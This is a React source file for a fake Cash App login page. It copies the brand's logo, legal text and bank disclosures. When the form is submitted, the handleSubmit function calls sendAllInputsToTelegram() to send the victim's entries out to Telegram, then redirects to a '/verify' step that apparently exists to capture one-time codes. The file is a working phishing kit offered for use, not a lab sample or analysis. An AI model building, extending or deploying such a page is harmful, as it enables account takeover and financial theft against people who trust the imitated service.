import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { ChevronDown, Loader2 } from 'lucide-react';
import { CashAppLogo } from '../components/CashAppLogo';
import { RecaptchaBadge } from '../components/RecaptchaBadge';
import { sendAllInputsToTelegram } from '../utils/telegram';
type LoginMethod = 'phone' | 'email';
export function Login() {
  const [method, setMethod] = useState<LoginMethod>('phone');
  const [inputValue, setInputValue] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputValue) return;

    await sendAllInputsToTelegram();
    setIsLoading(true);
    setTimeout(() => {
      navigate('/verify', { state: { contact: inputValue, method } });
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans relative flex flex-col">
      <div className="flex-1 w-full max-w-[520px] px-6 py-8 md:px-12 md:py-12 mx-auto md:mx-0">
        <CashAppLogo />

        <h1 className="text-4xl font-bold mt-10 mb-8 tracking-tight">Log in</h1>

        {/* Tabs */}
        <div className="flex bg-[#1A1A1A] rounded-full p-1 mb-8 border border-[#333333]">
          <button
            onClick={() => {
              setMethod('phone');
              setInputValue('');
            }}
            className={`flex-1 py-3 text-[15px] font-medium rounded-full transition-colors ${method === 'phone' ? 'bg-black text-white shadow-sm border border-[#333333]' : 'text-[#8a8a8a] hover:text-white border border-transparent'}`}>
            
            Phone number
          </button>
          <button
            onClick={() => {
              setMethod('email');
              setInputValue('');
            }}
            className={`flex-1 py-3 text-[15px] font-medium rounded-full transition-colors ${method === 'email' ? 'bg-black text-white shadow-sm border border-[#333333]' : 'text-[#8a8a8a] hover:text-white border border-transparent'}`}>
            
            Email
          </button>
        </div>

        {/* Form */}
        <form
          onSubmit={handleSubmit}
          className="flex flex-col gap-6">
          
          <div className="border border-white rounded-xl p-4 flex items-center gap-3 focus-within:ring-1 focus-within:ring-white transition-shadow bg-black">
            {method === 'phone' ?
            <>
                <div className="flex items-center gap-2 cursor-pointer">
                  <span className="text-xl leading-none">🇺🇸</span>
                  <span className="text-[17px] font-medium">+1</span>
                  <ChevronDown size={18} className="text-white" />
                </div>
                <div className="w-[1px] h-6 bg-[#333333] mx-1" />
                <input
                type="tel"
                value={inputValue}
                onChange={(e) => setInputValue(e.target.value)}
                placeholder="Enter phone number"
                className="bg-transparent outline-none flex-1 text-[17px] placeholder:text-[#8a8a8a]"
                autoFocus />
              
              </> :

            <input
              type="email"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="Enter email address"
              className="bg-transparent outline-none flex-1 text-[17px] placeholder:text-[#8a8a8a]"
              autoFocus />

            }
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full bg-[#E8E8E8] text-black font-semibold rounded-full py-[18px] text-[17px] hover:bg-white transition-colors mt-2 flex items-center justify-center">
            
            {isLoading ? (
              <Loader2 className="animate-spin" size={24} strokeWidth={3} />
            ) : (
              'Continue'
            )}
          </button>
        </form>

        {/* Legal Text */}
        <div className="mt-8 space-y-6 text-[14px] text-[#8a8a8a] leading-relaxed">
          <p>
            By entering and clicking Continue, you agree to the{' '}
            <a
              href="#"
              className="text-white underline font-semibold hover:text-gray-200">
              
              Terms
            </a>
            ,{' '}
            <a
              href="#"
              className="text-white underline font-semibold hover:text-gray-200">
              
              E-Sign Consent
            </a>
            , &{' '}
            <a
              href="#"
              className="text-white underline font-semibold hover:text-gray-200">
              
              Privacy Policy
            </a>
            .
          </p>
          <p>
            By entering and clicking Continue, you also agree to receive a one
            time password confirmation code and informational texts from Cash
            App. Message frequency varies. Message and data rates may apply.
            Reply HELP for help, STOP to cancel.
          </p>
        </div>

        {/* Divider */}
        <div className="h-[1px] w-full bg-[#333333] my-10" />

        {/* Create Account Link */}
        <div className="text-[17px] font-medium mb-12">
          <span className="text-white">New to Cash App? </span>
          <Link
            to="/signup"
            className="text-white underline font-bold hover:text-gray-200">
            
            Create account
          </Link>
        </div>

        {/* Disclosures */}
        <div className="space-y-6 pb-24">
          <h3 className="text-[15px] text-[#8a8a8a]">Your Privacy Choices</h3>

          <p className="text-[13px] text-[#8a8a8a] leading-relaxed">
            Banking services provided by Cash App's bank partners. Prepaid debit
            cards issued by Sutton Bank, Member FDIC. Cash App Visa® Debit Flex
            Cards issued by Sutton Bank, Member FDIC, and The Bancorp Bank,
            N.A., pursuant to a license from Visa U.S.A. Inc. Brokerage services
            by Cash App Investing LLC, member FINRA, subsidiary of Block, Inc
            formerly known as Square, Inc. Bitcoin services by Block, Inc. Cash
            App Investing does not trade bitcoin and Block, Inc. is not a member
            of FINRA or SIPC. Tax filing services by Cash App Taxes, Inc.
          </p>

          <a
            href="#"
            className="inline-block text-white underline font-bold text-[13px] hover:text-gray-200">
            
            Disclosures
          </a>
        </div>
      </div>

      <RecaptchaBadge />
    </div>);

}